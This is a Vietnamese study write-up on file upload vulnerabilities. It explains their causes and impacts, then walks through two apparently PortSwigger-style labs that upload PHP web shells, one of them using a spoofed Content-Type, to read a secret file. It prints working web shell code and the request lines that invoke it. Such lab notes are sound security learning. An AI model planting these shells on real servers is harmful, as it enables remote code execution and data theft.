# Tìm hiểu về File Upload
- Người thực hiện: Lê Thị Mỹ Tiên
- Cập nhật lần cuối
# Mục lục
# Nội dung
## 1. Tìm kiếm các chức năng Upload:
### 1.1 Khái niệm - tác động:
- Đây là lỗ hổng xảy ra khi máy chủ web cho phép người dùng tải tệp lên nhưng không kiểm soát đầy đủ các thuộc tính của tệp (tên, loại, nội dung, kích thước).
- Tùy thuộc vào mức độ kiểm soát mà hệ thống thực hiện, hậu quả có thể khác nhau:
  + **Thực thi mã từ xa (nguy hiểm nhất)**: Nếu hệ thống không kiểm tra loại file và cho phép upload file có thể chạy trên server (`.php`, `.jsp`, `.asp`…), hacker có thể triển khai web shell → chiếm quyền toàn bộ máy chủ.
  + **Ghi đè hoặc thay thế file quan trọng**: Nếu không kiểm tra tên file, attacker có thể upload một file trùng tên với file hệ thống hoặc ứng dụng → ghi đè file gốc → phá hoại hoặc chiếm quyền.
  + **Chiếm quyền truy cập thư mục bất ngờ**: Nếu hệ thống kết hợp với lỗ hổng duyệt thư mục (directory traversal), kẻ tấn công có thể đưa file vào thư mục quan trọng mà quản trị không lường trước.
  + **Tấn công từ chối dịch vụ (DoS)**: Nếu không giới hạn dung lượng file, hacker có thể upload file cực lớn → làm đầy ổ đĩa, khiến hệ thống ngưng hoạt động.
### 1.2 Lỗ hổng File Upload cách phát sinh:
Lỗ hổng File Upload phát sinh chủ yếu do việc kiểm soát không toàn diện hoặc không chặt chẽ: dựa vào blacklist, xác minh thuộc tính dễ bị giả mạo, hoặc triển khai không đồng nhất → tạo ra “lỗ hổng” cho attacker lợi dụng để tải file nguy hiểm.
### 1.3 Máy chủ web xử lý các yêu cầu về tệp tĩnh
- **Cơ chế cơ bản**:
Khi có một yêu cầu HTTP, máy chủ sẽ phân tích đường dẫn (URL) để xác định phần mở rộng tệp → Sau đó, so sánh phần mở rộng này với danh sách ánh xạ MIME (MIME type mapping) đã được cấu hình sẵn → tùy theo loại tệp, máy chủ sẽ quyết định cách xử lý tiếp theo.
- Các tình huống:
  + **Tệp tĩnh không thực thi (ảnh, CSS, HTML thuần)**: Máy chủ đọc nội dung file và trả về cho client trong phản hồi HTTP.
  + **Tệp có thể thực thi (ví dụ PHP, JSP, ASP) và máy chủ hỗ trợ**: Máy chủ gán biến từ tham số HTTP → chạy file script → gửi kết quả đầu ra (HTML, JSON, v.v.) về cho client. 👉 Đây chính là cơ chế khiến việc upload file script có thể dẫn đến Remote Code Execution.
  + **Tệp có thể thực thi nhưng máy chủ không hỗ trợ**: Thông thường: máy chủ trả về lỗi. Nếu cấu hình sai: máy chủ có thể trả lại nội dung mã nguồn dưới dạng text → gây rò rỉ thông tin nhạy cảm (source code disclosure).

----

## 2. Kỹ thuật Upload Backdoor:
### 2.1 Khai thác việc tải tệp không giới hạn để triển khai shell web
Ví dụ:
- Dòng lệnh PHP sau đây có thể được sử dụng để đọc các tệp tùy ý từ hệ thống tệp của máy chủ:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

- Một web shell linh hoạt hơn có thể trông giống như thế này:

`<?php echo system($_GET['command']); ?>`

- Tập lệnh này cho phép bạn truyền lệnh hệ thống tùy ý thông qua tham số truy vấn như sau:

`GET /example/exploit.php?command=id HTTP/1.1`

📘 **LAB 1: THỰC THI MÃ TỪ XA THÔNG QUA TẢI LÊN WEB SHELL**

Tải lên một web shell PHP cơ bản và sử dụng nó để trích xuất nội dung của tệp `/home/carlos/secret`

Bước 1: Upload ảnh → xác nhận hiển thị → lọc lịch sử Burp theo MIME Image → tìm request GET đến file ảnh → gửi sang Repeater.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/71b5963b-0370-402c-b3d4-1400551e39bc" />
Bước 2: Tạo một tệp có tên là `exploit.php`, chứa một tập lệnh để lấy nội dung tệp bí mật của Carlos. 

`<?php echo file_get_contents('/home/carlos/secret'); ?>` 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0b07dd96-4ca1-4896-8f4d-86421bbaebb5" />
Thông báo trong phản hồi xác nhận rằng tệp này đã được tải lên thành công.

Bước 3: Trong Burp Repeater, hãy thay đổi đường dẫn của yêu cầu để trỏ đến tệp PHP: 

`GET /files/avatars/exploit.php HTTP/1.1`
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d6bb3d30-3347-465a-a0bd-d5bcf849693b" />
Kết quả đầu ra: `1eCueh5dOL56ir9XPaW2KZgyc1GLbF9e`
### 2.2 Khai thác lỗi xác thực khi tải tệp lên
#### 2.2.1 Xác thực loại tệp bị lỗi
Các website thường có cơ chế chặn tệp độc hại, nhưng nhiều khi chỉ kiểm tra **Content-Type** trong phần upload. Vì tiêu đề này dễ bị giả mạo, kẻ tấn công có thể gửi file script độc hại nhưng gắn nhãn MIME như hình ảnh (`image/jpeg`). Nếu máy chủ không xác minh nội dung thực, webshell có thể được tải lên và thực thi, dẫn đến chiếm quyền điều khiển.

📘 **LAB 2: TẢI LÊN WEB SHELL BẰNG CÁCH VƯỢT QUA HẠN CHẾ CONTENT-TYPE**

Bước 1: Tạo một tệp có tên là exploit.php, chứa một tập lệnh để lấy nội dung bí mật của Carlos.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c0c6e4c7-4a8b-48a3-9c76-12cb96ae3446" />
Phản hồi cho biết bạn chỉ được phép tải lên các tệp có định dạng MIME `image/jpeg` hoặc `image/png`.

Bước 2:Trong phần nội dung tin nhắn liên quan đến tệp, hãy thay đổi giá trị được chỉ định Content-Type thành `image/jpeg`.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1c8fba88-e2e3-4fc3-84c6-912b65b23d31" />
Phản hồi cho biết tệp đã được tải lên thành công.

Bước 3: Chuyển sang tab Repeater khác chứa `GET /files/avatars/<YOUR-IMAGE>`. Trong đường dẫn, hãy thay thế tên tệp hình ảnh bằng `exploit.php` và gửi yêu cầu.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e63a558-97c2-4c30-be0c-00f3654a1024" />

